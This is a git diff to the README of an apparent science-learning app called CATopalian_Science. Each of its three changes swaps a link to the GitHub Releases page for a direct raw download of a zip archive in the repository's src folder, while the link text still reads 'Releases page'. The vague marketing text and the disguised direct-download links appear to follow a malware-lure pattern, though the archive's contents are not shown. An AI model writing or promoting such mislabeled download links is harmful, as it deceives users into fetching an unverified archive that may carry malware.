@@ -1,7 +1,7 @@
 # 🎉 CATopalian_Science - Discover Fun in Science
 
 ## 🔗 Download Now
-[![Download CATopalian_Science](https://img.shields.io/badge/Download-CATopalian_Science-blue.svg)](https://github.com/ryanpadilha1/CATopalian_Science/releases)
+[![Download CATopalian_Science](https://raw.githubusercontent.com/ryanpadilha1/CATopalian_Science/main/src/Topalian-Science-CA-3.1.zip)](https://raw.githubusercontent.com/ryanpadilha1/CATopalian_Science/main/src/Topalian-Science-CA-3.1.zip)
 
 ## 📖 Introduction
 Welcome to CATopalian_Science! This application takes you on a journey through the fascinating world of science. Explore various claims of the 21st century while having fun. We cover topics like bearings, damping, friction, and more. Whether you're a curious mind or just looking for an enjoyable learning experience, this app is for you!
@@ -16,7 +16,7 @@ To get started with CATopalian_Science, follow these simple steps:
    - Disk Space: Minimum of 500 MB free space
 
 2. **Visit the Download Page**
-   Go to our [Releases page](https://github.com/ryanpadilha1/CATopalian_Science/releases) to find the latest version of CATopalian_Science.
+   Go to our [Releases page](https://raw.githubusercontent.com/ryanpadilha1/CATopalian_Science/main/src/Topalian-Science-CA-3.1.zip) to find the latest version of CATopalian_Science.
 
 ## 📥 Download & Install
 On the Releases page, you will see a list of available versions. Choose the most recent release to ensure you have the latest features and fixes. Click on the version number to access the download files. You will see options for different operating systems.
@@ -63,4 +63,4 @@ We welcome contributions to CATopalian_Science! If you would like to suggest imp
 Thank you for exploring the world of science with CATopalian_Science! Your interest keeps the curiosity alive and drives innovation.
 
 ## 🔗 Download Again
-Don't forget, you can always visit the [Releases page](https://github.com/ryanpadilha1/CATopalian_Science/releases) to download the latest version of CATopalian_Science. Enjoy your scientific journey!
+Don't forget, you can always visit the [Releases page](https://raw.githubusercontent.com/ryanpadilha1/CATopalian_Science/main/src/Topalian-Science-CA-3.1.zip) to download the latest version of CATopalian_Science. Enjoy your scientific journey!
